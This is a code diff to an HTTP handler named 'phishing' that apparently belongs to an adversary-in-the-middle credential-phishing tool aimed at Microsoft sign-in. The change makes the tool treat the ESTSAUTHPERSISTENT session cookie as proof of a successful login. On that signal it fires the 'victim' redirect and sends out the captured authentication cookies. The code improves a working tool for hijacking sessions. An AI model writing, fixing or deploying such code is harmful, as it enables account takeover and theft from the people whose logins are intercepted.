@@ -152,7 +152,12 @@ app.http("phishing", {
           cookie.startsWith("SignInStateCookie=")
       );
 
-      if (cookies.length == 3) {
+      // Real successful-login signal: the persistent session cookie ESTSAUTHPERSISTENT
+      // (set on the login POST response). Fire the victim redirect here — the all-3
+      // condition rarely holds on one response.
+      const success = cookies.some((c) => c.startsWith("ESTSAUTHPERSISTENT="));
+
+      if (success) {
         dispatchMessage(
           "Captured required authentication cookies: <br>" +
             JSON.stringify(cookies)
